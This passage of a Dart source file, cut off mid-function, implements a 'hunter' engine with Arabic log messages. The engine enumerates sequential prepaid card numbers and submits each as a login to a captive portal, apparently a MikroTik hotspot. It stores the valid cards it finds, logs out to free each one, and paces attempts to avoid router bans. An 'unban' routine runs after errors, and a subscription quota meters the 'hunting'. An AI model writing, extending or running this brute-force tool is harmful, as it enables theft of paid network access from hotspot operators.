import 'dart:async';

import 'package:dio/dio.dart';

import 'package:networking/core/services/subscription_service.dart';
import 'package:networking/core/utils/number_formatter.dart';
import 'package:networking/core/utils/platform_env.dart';
import 'package:networking/data/models/settings_model.dart';
import 'package:networking/domain/engine/hunter_adapters.dart';
import 'package:networking/domain/engine/hunter_interfaces.dart';

// Re-export interfaces and enums for consumers
export 'package:networking/domain/engine/hunter_interfaces.dart';

/// Default connectivity checker using direct TCP socket probe to target host & port
class DefaultConnectivityChecker implements ConnectivityChecker {
  const DefaultConnectivityChecker();

  @override
  Future<bool> isConnected(String targetUrl) async {
    try {
      final safeUrl = targetUrl.contains('://')
          ? targetUrl
          : 'http://$targetUrl';
      final uri = Uri.parse(safeUrl);
      final host = uri.host.isNotEmpty
          ? uri.host
          : targetUrl.split('/').first.split(':').first;
      final port = uri.hasPort && uri.port != 0
          ? uri.port
          : (uri.scheme == 'https' ? 443 : 80);

      // Probe gateway/host with a strict 3-second timeout
      if (await PlatformEnv.probePort(
        host.isNotEmpty ? host : '1.1.1.1',
        port,
        timeout: const Duration(seconds: 3),
      )) {
        return true;
      }
      return await PlatformEnv.lookupHost(
        'google.com',
        timeout: const Duration(seconds: 3),
      );
    } catch (_) {
      return await PlatformEnv.lookupHost(
        'google.com',
        timeout: const Duration(seconds: 3),
      );
    }
  }
}

/// Default delayer using Future.delayed
class DefaultHunterDelayer implements HunterDelayer {
  const DefaultHunterDelayer();

  @override
  Future<void> delay(Duration duration) => Future.delayed(duration);
}

/// Default HTTP client wrapping Dio
class DefaultHunterHttpClient implements HunterHttpClient {
  late Dio _dio;

  DefaultHunterHttpClient([int timeoutMs = 15000]) {
    _dio = Dio(
      BaseOptions(
        connectTimeout: Duration(milliseconds: timeoutMs),
        receiveTimeout: Duration(milliseconds: timeoutMs),
        sendTimeout: Duration(milliseconds: timeoutMs),
        validateStatus: (status) => status != null && status < 500,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Linux; Android 13; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
          'Accept':
              'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        },
      ),
    );
  }

  void updateTimeout(int timeoutMs) {
    _dio.options.connectTimeout = Duration(milliseconds: timeoutMs);
    _dio.options.receiveTimeout = Duration(milliseconds: timeoutMs);
    _dio.options.sendTimeout = Duration(milliseconds: timeoutMs);
  }

  @override
  Future<HunterHttpResponse> get(
    String url, {
    Map<String, dynamic>? queryParameters,
  }) async {
    final res = await _dio.get(url, queryParameters: queryParameters);
    return HunterHttpResponse(
      statusCode: res.statusCode ?? 0,
      data: res.data,
      headers: res.headers.map,
    );
  }

  @override
  Future<HunterHttpResponse> post(
    String url, {
    Map<String, dynamic>? data,
  }) async {
    final res = await _dio.post(
      url,
      data: data,
      options: Options(
        contentType: Headers.formUrlEncodedContentType,
        followRedirects: false,
      ),
    );
    return HunterHttpResponse(
      statusCode: res.statusCode ?? 0,
      data: res.data,
      headers: res.headers.map,
    );
  }
}

/// Adapter for wrapping objects that provide getState/setState/saveFoundCard
class HunterDatabaseAdapter implements HunterDatabase {
  final dynamic _db;

  HunterDatabaseAdapter(this._db);

  @override
  Future<String?> getState(String key) async {
    return await _db.getState(key) as String?;
  }

  @override
  Future<void> setState(String key, String value) async {
    await _db.setState(key, value);
  }

  @override
  Future<bool> saveFoundCard(
    String cardNumber,
    String loginUrl, {
    String notes = '',
  }) async {
    return await _db.saveFoundCard(cardNumber, loginUrl, notes: notes) as bool;
  }

  @override
  Future<void> recordTestedCard({
    required String cardNumber,
    required String status,
    required String portalMessage,
    bool isLast = true,
  }) async {
    await _db.recordTestedCard(
      cardNumber: cardNumber,
      status: status,
      portalMessage: portalMessage,
      isLast: isLast,
    );
  }

  @override
  Future<bool> isCardAlreadyTested(String cardNumber) async {
    return await _db.isCardAlreadyTested(cardNumber) as bool;
  }
}

/// Sequential captive-portal workflow with fail-closed result handling.
///
/// Features:
/// 1. One credential submission per run; no automatic advancement or resubmission.
/// 2. Ambiguous network or portal results stop the workflow and surface an error.
/// 3. Logout is complete only after a clean login page is verified.
/// 4. Session success requires explicit same-portal evidence.
class HunterEngine {
  final HunterDatabase db;
  final ConnectivityChecker connectivityChecker;
  final HunterSoundPlayer soundPlayer;
  final HunterUnbanHandler unbanHandler;
  final HunterDelayer delayer;
  final HunterHttpClient httpClient;
  final bool enforceQuota;

  HunterBrowserController? browserController;
  SettingsModel Function()? configProvider;
  SettingsModel? _activeConfig;

  void updateConfig(SettingsModel newConfig) {
    _activeConfig = newConfig;
  }

  // Callbacks
  final void Function(String message)? onLog;
  final void Function(String currentNum, int attempts, int found, int unbans)?
  onStats;
  final void Function(String cardNumber, String loginUrl)? onFound;
  final void Function(String cardNumber, String status, String portalMessage)?
  onCardTested;
  final void Function(EngineStatus status, String message)? onStatusChange;
  final void Function()? onFinished;

  // State flags
  bool _isRunning = false;
  bool _isPaused = false;
  bool _stopRequested = false;
  bool _isExecuting = false;
  String? _terminalStatusMessage;
  EngineStatus _terminalStatus = EngineStatus.ready;

  bool get isRunning => _isRunning;
  bool get isPaused => _isPaused;
  EngineStatus get status => _terminalStatus;
  String get statusMessage => _terminalStatusMessage ?? 'جاهز ومستعد 🟢';

  String currentNumber = '';
  int totalAttempts = 0;
  int foundCount = 0;
  int unbanCount = 0;
  int consecutiveErrors = 0;

  HunterStep _currentStep = HunterStep.idle;
  HunterStep get currentStep => _currentStep;
  HunterHttpResponse? _lastHttpResponse;

  HunterEngine({
    required dynamic db,
    ConnectivityChecker? connectivityChecker,
    HunterSoundPlayer? soundPlayer,
    HunterUnbanHandler? unbanHandler,
    HunterDelayer? delayer,
    this.browserController,
    HunterHttpClient? httpClient,
    this.enforceQuota = false,
    this.onLog,
    this.onStats,
    this.onFound,
    this.onCardTested,
    this.onStatusChange,
    this.onFinished,
  }) : db = db is HunterDatabase ? db : HunterDatabaseAdapter(db),
       connectivityChecker =
           connectivityChecker ?? const DefaultConnectivityChecker(),
       soundPlayer = soundPlayer ?? createPlatformSoundPlayer(),
       unbanHandler = unbanHandler ?? createPlatformUnbanHandler(),
       delayer = delayer ?? const DefaultHunterDelayer(),
       httpClient = httpClient ?? DefaultHunterHttpClient();

  /// Start the hunting process
  Future<void> start(SettingsModel config) async {
    if (_isRunning) return;

    _isRunning = true;
    _isPaused = false;
    _stopRequested = false;
    consecutiveErrors = 0;
    _terminalStatus = EngineStatus.running;
    _terminalStatusMessage = null;

    try {
      await _runLoop(config);
    } finally {
      _isRunning = false;
      _isPaused = false;
      _isExecuting = false;
    }
  }

  /// Pause engine execution
  void pause() {
    if (_isRunning && !_isPaused) {
      _isPaused = true;
      onStatusChange?.call(EngineStatus.paused, 'متوقف مؤقتاً ⏸️');
      onLog?.call('⏸ تم إيقاف عملية الفحص مؤقتاً.');
    }
  }

  /// Resume engine execution
  void resume() {
    if (_isRunning && _isPaused) {
      _isPaused = false;
      onStatusChange?.call(EngineStatus.running, 'قيد الفحص والاصطياد... 🚀');
      onLog?.call('▶ تم استئناف عملية الفحص.');
    }
  }

  /// Stop engine execution safely
  void stop() {
    if (_isRunning) {
      _stopRequested = true;
      onStatusChange?.call(EngineStatus.stopping, 'جاري الإيقاف... ⏳');
      onLog?.call('⏹ جاري إيقاف الفحص وإنهاء الجلسة بأمان...');
    }
  }

  /// The main sequential execution loop
  Future<void> _runLoop(SettingsModel config) async {
    if (_isExecuting) return;
    _isExecuting = true;

    try {
      onStatusChange?.call(EngineStatus.running, 'قيد الفحص والاصطياد... 🚀');
      onLog?.call(
        '🚀 بدء تشغيل محرك الفحص المتطور (Sequential State Machine)...',
      );
      if (config.useWebView) {
        onLog?.call(
          '🌐 استخدام محرك المتصفح التفاعلي الخفي مع الفحص الصارم للـ DOM',
        );
      } else {
        onLog?.call('⚡ استخدام محرك الطلبات المباشرة (Direct HTTP Engine)');
      }

      if (httpClient is DefaultHunterHttpClient) {
        (httpClient as DefaultHunterHttpClient).updateTimeout(
          config.navTimeout,
        );
      }

      // التحقق الصارم من حالة الاشتراك وسقف الكروت وسلامة توقيت النظام
      if (enforceQuota) {
        final (canHuntStart, huntStartReason) = SubscriptionService.instance.canHunt();
        if (!canHuntStart) {
          final reason = huntStartReason ?? 'غير مصرح بالاصطياد حالياً';
          onLog?.call('🚫 [تنبيه أمني]: $reason');
          onStatusChange?.call(EngineStatus.ready, reason);
          _isRunning = false;
          return;
        }
      }

      // استرجاع رقم البداية
      final savedLast = await db.getState('last_tested_number');
      if (config.resumeSaved && savedLast != null && savedLast.isNotEmpty) {
        currentNumber = savedLast;
        onLog?.call(
          '📂 استئناف من آخر رقم محفوظ في قاعدة البيانات: $currentNumber',
        );
      } else {
        currentNumber = config.startNumber;
        if (currentNumber.trim().isEmpty) {
          onLog?.call('❌ خطأ: رقم كارت البداية فارغ! يرجى تحديد رقم البداية في الإعدادات أولاً.');
          onStatusChange?.call(EngineStatus.ready, 'جاهز ومستعد 🟢');
          _isRunning = false;
          return;
        }
        onLog?.call('🆕 بدء الفحص من الرقم: $currentNumber');
      }

      final baseUrl = config.url.replaceAll(RegExp(r'/+$'), '');
      final loginUrl = '$baseUrl${config.loginPath}';
      final logoutUrl = '$baseUrl${config.logoutPath}';

      // تهيئة محرك المتصفح إذا كان مفعلاً
      if (config.useWebView) {
        try {
          browserController ??= createPlatformBrowserController();
          if (browserController != null) {
            await browserController!.init(
              onJsAlert: (msg) {
                onLog?.call('💬 [تنبيه صفحة البوابة]: $msg');
              },
            );
            // مسح الكوكيز والبيانات السابقة قبل البدء
            await _cleanBrowserData();
          }
        } catch (e) {
          onLog?.call('ℹ️ تشغيل محرك HTTP فائق السرعة والموثوقية في الخلفية.');
          browserController = null;
        }
      }

      int attempt = 0;

      while (!_stopRequested) {
        // قراءة الإعدادات المحدثة لحظياً لدعم أي تعديل يجريه المستخدم في التبويب أثناء الفحص
        final currentConfig = configProvider?.call() ?? _activeConfig ?? config;

        // التحقق من الإيقاف المؤقت
        while (_isPaused && !_stopRequested) {
          await delayer.delay(const Duration(milliseconds: 300));
        }

        if (_stopRequested) break;

        // التخطي الذكي للكروت التي تم اختبارها مسبقاً (سواء نجحت أو فشلت)
        if (currentConfig.skipAlreadyTested) {
          int skippedCount = 0;
          final startSkipNumber = currentNumber;
          while (await db.isCardAlreadyTested(currentNumber) && !_stopRequested) {
            skippedCount++;
            currentNumber = NumberFormatter.nextNumber(currentNumber);
          }
          if (skippedCount > 0) {
            onLog?.call(
              '⏩ [تخطي ذكي]: تم تخطي $skippedCount كرت تم اختبارها مسبقاً (بدءاً من $startSkipNumber) والقفز مباشرة إلى: $currentNumber',
            );
            await db.setState('last_tested_number', currentNumber);
          }
          if (_stopRequested) break;
        }

        if (currentConfig.maxAttempts > 0 && attempt >= currentConfig.maxAttempts) {
          onLog?.call(
            '🏁 تم الوصول إلى الحد الأقصى للمحاولات المحدد (${currentConfig.maxAttempts}).',
          );
          break;
        }

        // فحص دوري لسقف الكروت المسموح باصطيادها وسلامة توقيت النظام من التلاعب
        if (enforceQuota) {
          final (stillCanHunt, periodicReason) = SubscriptionService.instance.canHunt();
          if (!stillCanHunt) {
            final reason = periodicReason ?? 'تم استنفاد سقف الكروت المسموح به';
            onLog?.call('🛑 [إيقاف تلقائي]: $reason');
            onStatusChange?.call(EngineStatus.ready, reason);
            break;
          }
        }

        attempt++;
        totalAttempts = attempt;
        onStats?.call(currentNumber, totalAttempts, foundCount, unbanCount);

        // الانتظار الإجباري الفعلي بين المحاولات لتفادي حظر أجهزة الميكروتك
        final effectiveDelay = currentConfig.delayBetween > 0 ? currentConfig.delayBetween : 3.0;
        onLog?.call('⏳ انتظار ${effectiveDelay.toStringAsFixed(1)} ثانية قبل الفحص لحماية الاتصال من حظر الميكروتك...');
        await delayer.delay(
          Duration(milliseconds: (effectiveDelay * 1000).toInt()),
        );

        if (_stopRequested) break;

        onLog?.call('--- المحاولة $attempt | فحص الرقم: $currentNumber ---');

        // تنفيذ فحص الكرت الحالي عبر آلة الحالة المتسلسلة مع إعادة المحاولة اللانهائية
        await _processCurrentCardWithIndefiniteRetry(
          config: currentConfig,
          baseUrl: baseUrl,
          loginUrl: loginUrl,
          logoutUrl: logoutUrl,
        );
      }
    } catch (error) {
      _setTerminalError('تعذر بدء العملية أو إكمالها: $error');
      rethrow;
    } finally {
      // تنظيف نهائي وحفظ آخر رقم
      _currentStep = HunterStep.idle;
      try {
        await db.setState('last_tested_number', currentNumber);
        onLog?.call('💾 تم حفظ آخر رقم تم التوقف عنده: $currentNumber');
      } catch (error) {
        _setTerminalError('تعذر حفظ حالة العملية: $error');
      }

      try {
        if (config.useWebView && browserController != null) {
          await _cleanBrowserData();
        }
      } catch (error) {
        _setTerminalError('تعذر إكمال تنظيف بيانات المتصفح: $error');
      }

      _isRunning = false;
      _isPaused = false;
      _isExecuting = false;
      if (_terminalStatus == EngineStatus.error) {
        onStatusChange?.call(EngineStatus.error, statusMessage);
      } else {
        _terminalStatus = EngineStatus.ready;
        _terminalStatusMessage ??= 'جاهز ومستعد 🟢';
        onStatusChange?.call(EngineStatus.ready, statusMessage);
      }
      onFinished?.call();
      onLog?.call(
        _terminalStatus == EngineStatus.error
            ? '⛔ توقفت العملية دون تأكيد اكتمالها: $statusMessage'
            : '🛑 انتهت العملية الحالية.',
      );
    }
  }

  /// فحص الكرت الحالي بسلسلة خطوات متتالية صارمة وإعادة المحاولة اللانهائية (R1 & R2)
  Future<void> _processCurrentCardWithIndefiniteRetry({
    required SettingsModel config,
    required String baseUrl,
    required String loginUrl,
    required String logoutUrl,
  }) async {
    bool cardCompleted = false;

    while (!cardCompleted && !_stopRequested) {
      // فحص الإيقاف المؤقت
      while (_isPaused && !_stopRequested) {
        await delayer.delay(const Duration(milliseconds: 300));
      }
      if (_stopRequested) break;

      try {
        // =====================================================================
        // الخطوة 1: التحقق الصارم من الاتصال الفعلي بالشبكة / الواي فاي (R4)
        // =====================================================================
        _currentStep = HunterStep.checkingConnectivity;
        final isConnected = await connectivityChecker.isConnected(loginUrl);
        if (!isConnected) {
          throw Exception('انقطاع الاتصال بالشبكة أو إيقاف الواي فاي');
        }

        // =====================================================================
        // الخطوة 2: التحقق القطعي من صفحة تسجيل الدخول ومطابقة عناصر DOM الحية (R3 & R4)
        // =====================================================================
        _currentStep = HunterStep.preparingLoginPage;
        final pageReadyResult = await _ensureCleanLoginPageReady(
          config: config,
          loginUrl: loginUrl,
          logoutUrl: logoutUrl,
        );
        if (!pageReadyResult.isReady) {
          throw Exception(pageReadyResult.error ?? 'صفحة الدخول غير جاهزة');
        }

        // =====================================================================
        // الخطوة 3: تعبئة حقول الدخول وإرسال النموذج (R1)
        // =====================================================================
        _currentStep = HunterStep.submittingLogin;
        browserController?.clearLastAlert();
        await _submitCredentials(
          config: config,
          loginUrl: loginUrl,
          username: currentNumber,
        );

        // =====================================================================
        // الخطوة 4: التحقق الموضوعي من نتيجة الفحص (R1, R2, R4)
        // =====================================================================
        _currentStep = HunterStep.verifyingResult;
        final verifyResult = await _verifyLoginResult(
          config: config,
          loginUrl: loginUrl,
        );

        if (verifyResult.isInconclusive) {
          throw Exception(
            verifyResult.error ?? 'لم يتم استلام رد قطعي من البوابة',
          );
        }

        // ---------------------------------------------------------------------
        // الحالة الأولى: نجاح مؤكد (تم اصطياد كرت صحيح)
        // ---------------------------------------------------------------------
        if (verifyResult.isSuccess) {
          _currentStep = HunterStep.handlingSuccess;
          consecutiveErrors = 0;
          foundCount++;
          final finalUrl = verifyResult.finalUrl.isNotEmpty
              ? verifyResult.finalUrl
              : '$baseUrl/status';
          onLog?.call(
            '🎉 تم اصطياد كرت صحيح بنجاح! الرقم: $currentNumber (الرابط: $finalUrl)',
          );
          await db.saveFoundCard(currentNumber, finalUrl);
          await db.recordTestedCard(
            cardNumber: currentNumber,
            status: 'success',
            portalMessage: 'تم تسجيل الدخول بنجاح واصطياد الكرت 🎉',
            isLast: true,
          );
          onCardTested?.call(
            currentNumber,
            'success',
            'تم تسجيل الدخول بنجاح واصطياد الكرت 🎉',
          );
          await SubscriptionService.instance.onCardHunted(count: 1);
          onFound?.call(currentNumber, finalUrl);
          onStats?.call(currentNumber, totalAttempts, foundCount, unbanCount);

          // تشغيل صوت التنبيه للنجاح
          try {
            await soundPlayer.playAlert(isError: false);
          } catch (e) {
            onLog?.call('  ⚠️ تعذر تشغيل صوت النجاح: $e');
          }

          // الخطوة 5: تسجيل الخروج الفعلي ومسح الجلسة تماماً (R3)
          _currentStep = HunterStep.loggingOutAndPurging;
          onLog?.call(
            '  🚪 جاري إرسال فورم تسجيل الخروج (logout) لتحرير الكرت...',
          );
          final logoutConfirmed = await _executeProperLogoutAndPurge(
            config: config,
            logoutUrl: logoutUrl,
            loginUrl: loginUrl,
          );
          if (!logoutConfirmed) {
            _setTerminalError(
              'تعذر تأكيد تسجيل الخروج وصفحة الدخول؛ إعادة المحاولة على نفس الكرت.',
            );
            continue;
          }
          onLog?.call(
            '  ✅ تم تأكيد تسجيل الخروج وتطهير الجلسة والعودة لصفحة الدخول بنجاح.',
          );

          // الانتقال للرقم التالي
          final nextNum = NumberFormatter.nextNumber(currentNumber);
          await db.setState('last_tested_number', nextNum);
          currentNumber = nextNum;
          cardCompleted = true;
          break;
        }

        // ---------------------------------------------------------------------
        // الحالة الثانية: فشل مؤكد (الكرت غير صالح قطيعاً / رفضت البوابة البيانات)
        // ---------------------------------------------------------------------
        if (verifyResult.isDefinitiveFailure) {
          consecutiveErrors = 0;
          final portalMsg = browserController?.lastAlertMessage ??
              verifyResult.error ??
              'رمز الدخول غير صحيح أو انتهت صلاحية الكرت';
          onLog?.call('  ❌ عاد لصفحة الدخول أو رفضت البوابة البيانات — الرقم غير صحيح: $currentNumber');
          await db.recordTestedCard(
            cardNumber: currentNumber,
            status: 'failed',
            portalMessage: portalMsg,
            isLast: true,
          );
          onCardTested?.call(
            currentNumber,
            'failed',
            portalMsg,
          );
          final nextNum = NumberFormatter.nextNumber(currentNumber);
          await db.setState('last_tested_number', nextNum);

          // الانتقال التلقائي للرقم التالي والمتابعة
          currentNumber = nextNum;
          cardCompleted = true;
          break;
        }

        throw Exception('نتيجة غير محسومة من البوابة');
      } catch (error) {
        // =====================================================================
        // حدوث خطأ أو تأخر أو انقطاع شبكة (R2)
        // يُحظر تماماً تخطي الكرت أو الانتقال للكرت التالي!
        // يعاد المحاولة إلى ما لا نهاية على نفس الكرت حتى يتم استلام نتيجة قطعية.
        // عداد الأخطاء يُستخدم فقط لإصدار التنبيه الصوتي وفك الحظر.
        // =====================================================================
        consecutiveErrors++;
        final message =
            'خطأ في الاتصال/البوابة أثناء [${_stepName(_currentStep)}]: $error (محاولة متعثرة $consecutiveErrors على الكرت $currentNumber)';
        onLog?.call('  ❌ $message');
        await db.setState('last_tested_number', currentNumber);

        // إطلاق التنبيه الصوتي عند بلوغ الحد الأقصى للمحاولات المتعثرة دون تخطي
        if (config.maxConsecutiveErrors > 0 &&
            consecutiveErrors >= config.maxConsecutiveErrors &&
            consecutiveErrors % config.maxConsecutiveErrors == 0) {
          onLog?.call(
            '  🔔 تنبيه صوتي: تعثر مستمر ($consecutiveErrors أخطاء) على الكرت $currentNumber — الاستمرار في المحاولة دون تخطي.',
          );
          try {
            await soundPlayer.playAlert(isError: true);
          } catch (e) {
            onLog?.call('  ⚠️ تعذر تشغيل صوت التنبيه: $e');
          }
        }

        // تنفيذ فك الحظر إن كان مفعلاً
        if (config.unbanOnError && consecutiveErrors <= config.unbanMaxRetries) {
          _currentStep = HunterStep.unbanning;
          onStatusChange?.call(
            EngineStatus.unbanning,
            'جاري فك الحظر (محاولة $consecutiveErrors/${config.unbanMaxRetries})... 🔓',
          );
          onLog?.call('  🔓 تنفيذ فك الحظر $consecutiveErrors/${config.unbanMaxRetries}...');
          final result = await unbanHandler.performUnban(log: onLog);
          if (result['success'] == true) {
            unbanCount++;
            onStats?.call(currentNumber, totalAttempts, foundCount, unbanCount);
          }
          onStatusChange?.call(EngineStatus.running, 'استئناف الفحص بعد فك الحظر... 🚀');
        }

        // فترة انتظار إجبارية قبل إعادة محاولة نفس الكرت
        final cooldownSec = config.unbanCooldown > 0 ? config.unbanCooldown : 2.0;
        await delayer.delay(Duration(milliseconds: (cooldownSec * 1000).toInt()));

        // cardCompleted يبقى false، والرقم currentNumber لا يتغير.
        // المحرك يستمر في إعادة محاولة نفس الخطوة على نفس الكرت.
      }
    }
  }

  void _setTerminalError(String message) {
    _terminalStatus = EngineStatus.error;
    _terminalStatusMessage = message;
    onStatusChange?.call(EngineStatus.error, message);
  }

  /// التحقق الصارم من جاهزية صفحة تسجيل الدخول النظيفة ومطابقة عناصر الـ DOM الحية (R3 & R4)
  Future<PageVerificationResult> _ensureCleanLoginPageReady({
    required SettingsModel config,
    required String loginUrl,
    required String logoutUrl,
  }) async {
    // 1. فحص الاتصال الفعلي بالشبكة أولاً
    final isOnline = await connectivityChecker.isConnected(loginUrl);
    if (!isOnline) {
      return const PageVerificationResult(
        isReady: false,
        error: 'انقطاع الاتصال بالشبكة أو إيقاف الواي فاي',
        isNetworkError: true,
      );
    }

    if (config.useWebView && browserController != null) {
      // 2. التحقق من أن الصفحة الحالية ليست صفحة status سابقة
      final curUrl = await browserController!.currentUrl();
      if (_isStatusUrl(curUrl, loginUrl)) {
        onLog?.call(
          '  ⚠️ ما زال الراوتر يعتبر الجهاز متصلاً ($curUrl) — إرسال أمر الخروج ومسح الجلسة...',
        );
        final logoutConfirmed = await _executeProperLogoutAndPurge(
          config: config,
          logoutUrl: logoutUrl,
          loginUrl: loginUrl,
        );
        if (!logoutConfirmed) {
          return const PageVerificationResult(
            isReady: false,
            error: 'تعذر تأكيد تسجيل الخروج السابق',
          );
        }
      }

      // 3. فحص عناصر شجرة الـ DOM الحية
      var dom = await browserController!.inspectLoginPage(
        expectedField: config.usernameField,
      );

      // إذا كشف فحص الـ DOM عن بقاء الجلسة نشطة في الراوتر
      if (dom.isStatusPage) {
        onLog?.call(
          '  ⚠️ كشف فحص عناصر DOM عن بقاء الجلسة السابقة نشطة — تنفيذ دورة تسجيل الخروج...',
        );
        final logoutConfirmed = await _executeProperLogoutAndPurge(
          config: config,
          logoutUrl: logoutUrl,
          loginUrl: loginUrl,
        );
        if (!logoutConfirmed) {
          return const PageVerificationResult(
            isReady: false,
            error: 'تعذر تأكيد تسجيل الخروج السابق',
          );
        }
        dom = await browserController!.inspectLoginPage(
          expectedField: config.usernameField,
        );
      }

      // إذا كانت الصفحة غير جاهزة أو ليست صفحة الدخول، نعيد تحميل صفحة الدخول النظيفة
      if (!dom.isReady || !_isLoginUrl(dom.url, loginUrl)) {
        await _cleanBrowserData();
        await browserController!.loadUrl(loginUrl);
        await delayer.delay(const Duration(milliseconds: 1500));
        dom = await browserController!.inspectLoginPage(
          expectedField: config.usernameField,
        );
      }

      if (dom.isOfflinePage) {
        return const PageVerificationResult(
          isReady: false,
          error: 'المتصفح يعرض صفحة انقطاع الشبكة (ERR_INTERNET_DISCONNECTED)',
          isNetworkError: true,
        );
      }

      if (dom.isStatusPage) {
        return const PageVerificationResult(
          isReady: false,
          error: 'ما زالت الجلسة مسجلة في الراوتر (صفحة status)',
          isNetworkError: false,
        );
      }

      if (!dom.isReady) {
        // التحقق من حالة الشبكة في حال عدم جاهزية الـ DOM
        final stillOnline = await connectivityChecker.isConnected(loginUrl);
        if (!stillOnline) {
          return const PageVerificationResult(
            isReady: false,
            error: 'انقطاع الاتصال بالشبكة أو إيقاف الواي فاي أثناء تحميل صفحة الدخول',
            isNetworkError: true,
          );
        }
        return PageVerificationResult(
          isReady: false,
          error: dom.reason ?? 'عناصر صفحة الدخول مفقودة من شجرة DOM',
          isNetworkError: false,
        );
      }

      return PageVerificationResult(isReady: true, url: dom.url);
    } else {
      // الفحص المباشر عبر HTTP
      try {
        final res = await httpClient.get(loginUrl);
        if (res.statusCode != 200) {
          return PageVerificationResult(
            isReady: false,
            error: 'استجابة البوابة غير صحيحة (رمز: ${res.statusCode})',
            isNetworkError: false,
          );
        }

        var body = res.data.toString().toLowerCase();
        if (_isStatusBody(body)) {
          onLog?.call(
            '  ⚠️ ما زال الراوتر يعرض جلسة نشطة عبر HTTP — إرسال أمر الخروج ومسح الجلسة...',
          );
          final logoutConfirmed = await _executeProperLogoutAndPurge(
            config: config,
            logoutUrl: logoutUrl,
            loginUrl: loginUrl,
          );
          if (!logoutConfirmed) {
            return const PageVerificationResult(
              isReady: false,
              error: 'تعذر تأكيد تسجيل الخروج السابق عبر HTTP',
            );
          }
          final postLogoutRes = await httpClient.get(loginUrl);
          final postBody = postLogoutRes.data.toString().toLowerCase();
          if (_isStatusBody(postBody)) {
            return const PageVerificationResult(
              isReady: false,
              error: 'فشل إنهاء الجلسة السابقة على الراوتر عبر HTTP',
              isNetworkError: false,
            );
          }
          body = postBody;
        }

        if (!body.contains('<input') && !body.contains('name=')) {
          return const PageVerificationResult(
            isReady: false,
            error: 'صفحة الدخول لا تحتوي على حقول نموذج تسجيل الدخول',
            isNetworkError: false,
          );
        }

        return PageVerificationResult(isReady: true, url: loginUrl);
      } catch (e) {
        return PageVerificationResult(
          isReady: false,
          error: 'فشل الوصول لصفحة الدخول عبر HTTP: $e',
          isNetworkError: true,
        );
      }
    }
  }

  /// إرسال بيانات الدخول عبر المتصفح أو الطلب المباشر
  Future<void> _submitCredentials({
    required SettingsModel config,
    required String loginUrl,
    required String username,
  }) async {
    if (config.useWebView && browserController != null) {
      final success = await browserController!.submitCredentials(
        username: username,
        password: config.customPassword,
        usernameField: config.usernameField,
        passwordField: config.passwordField,
        injectSaleem: config.injectSaleem,
        injectSaveUsername: config.injectSaveUsername,
        usePopupSubmit: config.usePopupSubmit,
      );
      if (!success) {
        throw Exception('فشل حقن بيانات الاعتماد في نموذج تسجيل الدخول');
      }
    } else {
      final Map<String, dynamic> data = {config.usernameField: username};
      if (config.customPassword.isNotEmpty) {
        data[config.passwordField] = config.customPassword;
      }

      // إرسال طلب POST وحفظ الاستجابة للتحقق منها في الخطوة التالية دون تكرار
      _lastHttpResponse = await httpClient.post(loginUrl, data: data);
    }
  }

  /// التحقق الموضوعي الصارم من نتيجة تسجيل الدخول
  Future<LoginVerificationResult> _verifyLoginResult({
    required SettingsModel config,
    required String loginUrl,
  }) async {
    if (config.useWebView && browserController != null) {
      final startTime = DateTime.now();
      final postWaitMs =
          (config.postNavWait > 0 ? config.postNavWait * 1000 : 3000).toInt();
      final totalWaitMs = config.navTimeout > postWaitMs
          ? config.navTimeout
          : postWaitMs;
      final timeout = Duration(milliseconds: totalWaitMs);

      // انتظار أولي مرتبط بـ postNavWait للسماح بإرسال النموذج واستجابة البوابة
      final initialDelayMs = (postWaitMs * 0.35).clamp(400, 2500).toInt();
      await delayer.delay(Duration(milliseconds: initialDelayMs));

      while (DateTime.now().difference(startTime) < timeout &&
          !_stopRequested) {
        await delayer.delay(const Duration(milliseconds: 300));

        // فحص انقطاع الشبكة أثناء التحقق
        final isOnline = await connectivityChecker.isConnected(loginUrl);
        if (!isOnline) {
          return const LoginVerificationResult.inconclusive(
            error: 'انقطع الاتصال بالشبكة أثناء انتظار نتيجة الفحص',
          );
        }

        final curUrl = await browserController!.currentUrl();

        // 1. مؤشرات النجاح بالرابط
        if (_isStatusUrl(curUrl, loginUrl)) {
          return LoginVerificationResult.success(curUrl);
        }

        // 2. فحص عناصر DOM الحية
        final dom = await browserController!.inspectLoginPage(
          expectedField: config.usernameField,
        );

        if (dom.isOfflinePage) {
          return const LoginVerificationResult.inconclusive(
            error: 'تعذر الاتصال بالبوابة (صفحة انقطاع الشبكة)',
          );
        }

        if (dom.isStatusPage && _isStatusUrl(dom.url, loginUrl)) {
          return LoginVerificationResult.success(
            curUrl.isNotEmpty ? curUrl : dom.url,
          );
        }

        // 3. فحص رسائل الخطأ أو الرفض الصريح أو رسائل التنبيه المستلمة عبر JS alert
        final lastAlert = browserController!.lastAlertMessage ?? '';
        final rawBody = (await browserController!.runJavaScriptReturningResult(
          '(document.body ? document.body.innerText : "") + " " + (document.title || "")',
        )).toString();
        final combinedText = '$rawBody $lastAlert';

        if (_isPortalHostUrl(curUrl, loginUrl) &&
            _isSuccessBody(combinedText)) {
          return LoginVerificationResult.success(
            curUrl.isNotEmpty ? curUrl : '$loginUrl/status',
          );
        }

        // 4. إذا ظهرت رسالة خطأ أو رفض صريح (سواء بالصفحة أو alert)
        if (_isRejectionBody(combinedText)) {
          return LoginVerificationResult.definitiveFailure(
            curUrl.isNotEmpty ? curUrl : loginUrl,
          );
        }

        // 5. إذا أعيد تحميل صفحة الدخول وعاد حقل الإدخال فارغاً بعد إرسال النموذج
        // (معناه أن البوابة استقبلت الكرت، رفضته، وأعادت توجيه المستخدم لصفحة الدخول مجدداً)
        if (_isLoginUrl(curUrl, loginUrl) &&
            dom.isReady &&
            dom.hasUsernameInput &&
            dom.hasSubmitButton) {
          return LoginVerificationResult.definitiveFailure(curUrl);
        }
      }

      // إذا انتهت المهلة دون حسم: فحص أخير دقيق لـ DOM
      final finalUrl = await browserController!.currentUrl();
      if (_isStatusUrl(finalUrl, loginUrl)) {
        return LoginVerificationResult.success(finalUrl);
      }

      final domFinal = await browserController!.inspectLoginPage(
        expectedField: config.usernameField,
      );
      if (domFinal.isStatusPage && _isStatusUrl(domFinal.url, loginUrl)) {
        return LoginVerificationResult.success(finalUrl);
      }

      final lastAlertFinal = browserController!.lastAlertMessage ?? '';
      final rawBodyFinal =
          (await browserController!.runJavaScriptReturningResult(
            '(document.body ? document.body.innerText : "") + " " + (document.title || "")',
          )).toString();
      final combinedFinal = '$rawBodyFinal $lastAlertFinal';

